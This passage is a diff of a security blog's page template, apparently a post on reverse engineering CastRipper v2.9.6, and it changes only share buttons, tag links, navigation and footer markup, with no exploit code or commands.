+          aria-label="Submit to Reddit"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span></a
+        >
       
-    </h3>
-    <div class="text-sm text-neutral-500 dark:text-neutral-400">
+    
       
-
-
-
-
-
-
-
-  
-
-  
-  
-    
-  
-
-  
-
-  
-
-  
-    
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2024-03-09 16:15:03 -0500 EST">9 March 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
-    
-
-    
-    
-  </div>
-
-  
-  
-    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://pentesthacks.ca/posts/postsec/castripper_revereng01/&amp;title=Reverse%20Engineering%20CastRipper%20v2.9.6"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
       
-        
-          
-            <a
-              href="/categories/offensivesecurity/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >OffensiveSecurity</a
-            >
-          
-        
+    
+  </section>
+
+
       
-        
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
           
-            <a
-              href="/tags/windowsinternal/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >WindowsInternal</a
-            >
+            <a class="group flex" href="/posts/postsec/windowspeaddressofnames/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Windows PE NumberofNames, AddressOfNames,AddressOfFunctions & AddressOfNameOrdinals (windbg)</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-07-07 13:57:14 -0400 EDT">7 July 2024</time>
+                  
+                </span>
+              </span>
+            </a>
           
-            <a
-              href="/tags/reverseeng/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >ReverseEng</a
-            >
+        </span>
+        <span>
           
-            <a
-              href="/tags/exploitdev/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >ExploitDev</a
-            >
-          
-        
-      
+        </span>
+      </div>
     </div>
   
 
 
-    </div>
-    
-  </div>
-</article>
+      
+    </footer>
+  </article>
 
-  
-
-
-</section>
-
-  
-
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
         
       </main><footer class="py-10 print:hidden">
   
